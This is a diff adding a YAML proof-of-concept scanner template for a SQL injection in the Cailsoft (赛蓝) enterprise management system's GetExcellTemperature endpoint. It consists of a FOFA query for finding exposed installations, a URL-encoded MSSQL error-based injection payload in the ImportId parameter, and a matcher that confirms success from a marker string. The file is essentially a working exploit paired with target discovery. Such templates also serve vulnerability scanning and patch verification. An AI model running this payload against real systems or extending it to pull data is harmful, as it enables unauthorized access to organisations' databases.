@@ -1,0 +1,14 @@
+id: poc-yaml-cailsoft-getexcelltemperature-sqli
+info:
+  name: 赛蓝企业管理系统 GetExcellTemperature SQL注入
+  severity: high
+  tags:
+  - sql-injection
+  finger: 企业管理系统
+  fofa: body="www.cailsoft.com" || body="赛蓝企业管理系统"
+requests:
+- method: GET
+  path: /BaseModule/ExcelImport/GetExcellTemperature?ImportId=%27%20AND%206935%20IN%20(SELECT%20(CHAR(113)%2BCHAR(122)%2BCHAR(112)%2BCHAR(106)%2BCHAR(113)%2B(SELECT%20(CASE%20WHEN%20(6935%3D6935)%20THEN%20CHAR(49)%20ELSE%20CHAR(48)%20END))%2BCHAR(113)%2BCHAR(122)%2BCHAR(113)%2BCHAR(118)%2BCHAR(113)))%20AND%20%27qaq%27=%27qaq
+  expression: "status_code == 200 && \ncontains(body,\"qzpjq1qzqvq\")\n"
+variables: {}
+transport: http
